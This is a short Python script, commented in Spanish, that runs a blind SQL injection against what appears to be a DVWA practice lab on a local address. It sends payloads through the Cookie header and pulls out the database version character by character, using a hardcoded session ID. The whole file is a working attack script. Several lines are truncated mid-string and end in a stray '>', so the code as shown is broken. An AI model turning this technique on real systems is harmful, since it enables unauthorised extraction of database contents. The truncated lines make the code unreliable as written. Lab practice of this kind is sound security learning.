import requests
from requests.structures import CaseInsensitiveDict

# 🔹 Sustituye con el PHPSESSID obtenido desde tu navegador
PHPSESSID = "8cni6ef4ro9c7dvav16s4hb121"

# 🔹 Definir la URL del ataque
url = 'http://192.168.1.57/vulnerabilities/sqli_blind/'

headers = CaseInsensitiveDict()
headers["Cookie"] = f"security=high; PHPSESSID={PHPSESSID}"

# 🔹 Paso 1: Encontrar la longitud de la versión
for i in range(1, 100):  # Buscamos hasta una longitud máxima de 100
    headers["Cookie"] = f"id=1'+and+length(version())={i}%23; security=high; PH>
    r = requests.get(url, headers=headers)
    
    if 'User ID exists in the database' in r.text:
        print(f'✅ Longitud de la versión de la base de datos: {i}')
        length = i
        break

# 🔹 Paso 2: Extraer la versión carácter por carácter
print("🔍 Extrayendo versión de la base de datos...")

version_db = ""

for i in range(1, length + 1):
    for s in range(30, 126):  # ASCII imprimibles
        headers["Cookie"] = f"id=1'+and+ascii(substring(version(),{i},1))={s}%2>
        r = requests.get(url, headers=headers)

        if 'User ID exists in the database' in r.text:
            version_db += chr(s)
            print(chr(s), end='', flush=True)  # Muestra los caracteres en tiem>
            break

print(f"\n✅ Versión de la base de datos obtenida: {version_db}")
